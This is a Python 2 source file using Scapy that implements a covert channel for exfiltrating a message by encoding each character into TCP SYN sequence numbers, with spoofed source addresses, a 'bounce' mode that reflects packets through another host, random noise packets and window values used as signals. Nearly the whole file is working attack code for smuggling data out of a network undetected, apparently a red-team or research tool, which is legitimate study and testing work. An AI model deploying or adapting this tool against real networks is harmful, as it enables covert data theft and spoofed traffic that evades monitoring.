"""
This is all the functionality we need to exfiltrate a message by smuggling it
in TCP sequence numbers in SYN packets, much like a SYN stealth scan, execpt
that we're sending SYN packets over and over to the same host.

One advantage of this approach is that we can spoof the source address since we
don't care what happens to the SYN/ACK packets that get sent back.

Todo:
    We should probably modify the server so that it doesn't even send SYN/ACK but
    that might be too low level for this time.

"""

from scapy.all import *

# Yes, it's a magical number!
# C: not really :)
# The max 32-bit number is 4294967295
# max/256 = 16777215 + 1 = our multiplier
# max/16777216 = 255 ..which makes more sense to me.
# ASCII encodes 128 characters.
#   ord('A') is 65, the decimal notation for the letter A
#   ord('\0') is 0
#   ord('~') is 126
#   DEL is 127
# Ok, 16777216 is somewhat magical. But it's one of a numbers we can use to
# multiply any character with and get a number that fits within the 32bit limit.
multiplier = 16777216  # the server will be performing the division


def add_n0ise_iseq(pkt, exfilArrayCharValue):
    """Add noise to the sequence numbers

    Args:
        pkt (Packet): Base IP packet from Scapy
        exfilArrayCharValue (int): The value of the next character
    """
    print '[*] adding n0ise to iseq..'
    # -y = exfilArray[i]
    # Add some randomness
    randy = random.randint(-9999999, 9999999)  # too large will produce error
    pkt.seq = exfilArrayCharValue + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print "\nERROR: Problem sending packets, are you root?\n"
        exit(0)


def convert_iseq(message):
    """ Convert the message to an array of initial sequence numbers

    Args:
        message (str): The message to be encoded
        multiplier (int): Magical number!

    Returns:
        Array: The converted ordinal array of the message to exfiltrate

    Todo:
        TODO: recover safely from is_32bit(), setting to X for now
    """
    retval = []
    print '[*] converting iseq message: %s' % message
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * multiplier
        # Add seq to the global exfilArray.
        if is_32bit(exfilChar):
            print '[+] iseq size OK'
        else:
            print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
            exfilChar = ord(X) * multiplier
        retval.append(exfilChar)
        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
    return retval


def exfil_iseq(spoof, destination, dstport, message, bounce):
    """ Send out a message using initial sequence numbers, much like an Nmap
    SYN scan. Each packet has an initial sequence number that corresponds to
    a character in the message to send.

    Note:
        Initial sequence numbers are 32 bit
        We slow down the sending

    Args:
        spoof (str):       The spoofed source IP address
        destination (str): The destination address for the packet
        dstport (int):     The destination port for the packets
        message (str):     The message we want to exfiltrate
        multiplier (int):  (semi) Magical number!
    """
    i = 0
    exfilMsg = convert_iseq(message)
    # if bounce == True then dst=spoof, src=destination, dport=80, sport=dstport
    # window = 1339 will indicate that this is a bounced packet
    if bounce == True:
        pkt = IP(src=destination, dst=spoof) / TCP(sport=dstport, dport=80, flags='S')
    else:
        pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')

    for c in exfilMsg:
        add_n0ise_iseq(pkt, exfilMsg[i])
        if bounce == 1:
            pkt.window = 1339
        else:
            pkt.window = 1337
        pkt.seq = exfilMsg[i]
        # slow our roll
        time.sleep(0.4)
        try:
            print '[window] ' + str(pkt.window)
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom(pkt)


def is_32bit(input_to_check):
    """ Validate that we have a 32-bit value so it will fit into the
    TCP sequence number header

    Args:
        input_to_check (int): Integer value to check

    Returns:
        True if the value is 32-bit, False otherwise
    """
    bitl = (input_to_check).bit_length()
    if bitl <= 32:
        # print '[*] OK: int is 32bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


def send_eom(pkt):
    """
    Send the last message, encoded with a special TTL to let the server know
    we're done. Set the ttl=60 to indicate end-of-message

    Args:
        pkt (Packet): Scapy packet
    """

    print '[*] Sending End-Of-Message'
    pkt.window = 7331  # It's a magical number!
    send(pkt)
